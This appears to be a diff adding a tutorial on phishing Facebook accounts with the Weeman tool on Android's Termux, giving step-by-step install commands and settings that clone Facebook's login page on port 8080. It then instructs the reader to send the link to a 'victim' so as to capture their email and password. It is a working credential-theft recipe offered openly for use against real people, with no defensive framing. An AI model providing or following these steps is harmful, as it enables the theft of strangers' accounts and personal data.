@@ -1,0 +1,89 @@
+Weeman is a simple but effective python tool for phishing, with this tool you can easily do phishing on any website, you can do phishing on Facebook to hack facebook accounts,
+
+This tool can be used to do phishing on various websites like Gmail, Twitter etc,
+Okay cool, now let's go to the tutorial point
+
+Firstly download and install Termux app on your Android
+Then open Termux and type these commands and hit enter
+
+
+1."apt update && upgrade"
+
+
+Now give permission to Termux to access your memory
+So type below command
+
+termux-setup-storage
+
+Then type this command to install python2
+
+
+2."pkg install python2"
+
+
+During installation of python2 you will be asked " Termux will use some space"
+Just type Y and hit enter
+Now you have to install git, for that type this command
+
+
+3."pkg install git"
+
+
+After successfully installing git, type below command to install Weeman
+
+
+4."git clone https://github.com/evait-security/weeman.git"
+
+
+After that type this command
+
+
+5."cd weeman && ls"
+
+
+Now you have to type below command to run Weeman on Python
+
+
+6."python2 weeman.py"
+
+
+Now you will see the Weeman user interface, its time to set all the necessary command
+
+firstly you have to find your IP address, it is important so that you can find your IP address through termux
+
+Just open a new tab on termux and type below command to see your IP
+
+
+---"ifconfig"---
+
+
+Now you got your IP address, now type below commands to get started
+
+7."set url http://facebook.com"
+
+8."set action_url https://facebook.com"
+
+9."set port 8080"
+
+Note that, in this tutorial, we are going to do phishing for Facebook, inorder to hack facebook using Termux, so we have typed set url to Facebook.com.
+
+How To Hack Facebook Using Termux (Weeman)
+
+If you're targeting Facebook mobile users then set the url to m.facebook.com
+Eg: set url http://m.facebook.com
+Now finally type this command
+
+10."run"
+
+that's all you have successfully executed all the commands to hack Facebook
+
+Now you have to share your IP with your victim to get his username and password
+
+so send a link to your victim as http://Your_IP:8080
+
+Eg: http://127.0.0.1:8080
+
+Executing weeman in victim browser
+
+
+When your victim opens the link then it will open a phishing page and when they enter their email and password then you will easily get them as shown in the screenshot
